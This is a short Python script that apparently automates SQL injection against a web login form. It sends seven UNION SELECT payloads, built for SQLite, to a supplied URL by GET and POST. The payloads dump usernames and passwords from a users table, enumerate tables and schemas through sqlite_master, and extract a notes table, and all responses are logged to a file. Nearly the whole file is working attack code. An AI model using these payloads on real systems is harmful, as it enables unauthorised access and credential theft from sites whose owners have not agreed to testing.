import requests
import sys

if len(sys.argv) != 4:
	print(f"Usage: python3 request.py <url> <username or post-parameter> <password>")
	exit()
url = sys.argv[1]
ii = [
 "1' UNION SELECT username ,password FROM users order by id-- -",
 "1' UNION SELECT 1,group_concat(password) FROM users order by id-- -",
 "1' UNION select 1,tbl_name from sqlite_master -- -",
 "1' UNION SELECT NULL, sqlite_version(); -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'; -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'; -- -",
 "' UNION SELECT 1,notes FROM notes-- -"]
f = open("log.txt","w")
for i in ii:
    myobj = {sys.argv[2]: i,
             sys.argv[3]: '123456'}
    x = requests.get(url) #, data=myobj)
    print(x.text)
    f.write(x.text)
    myobj = {'username': i,
            'password': '123456'}
    x = requests.post(url, data=myobj)
    print(x.text)
    f.write(x.text)
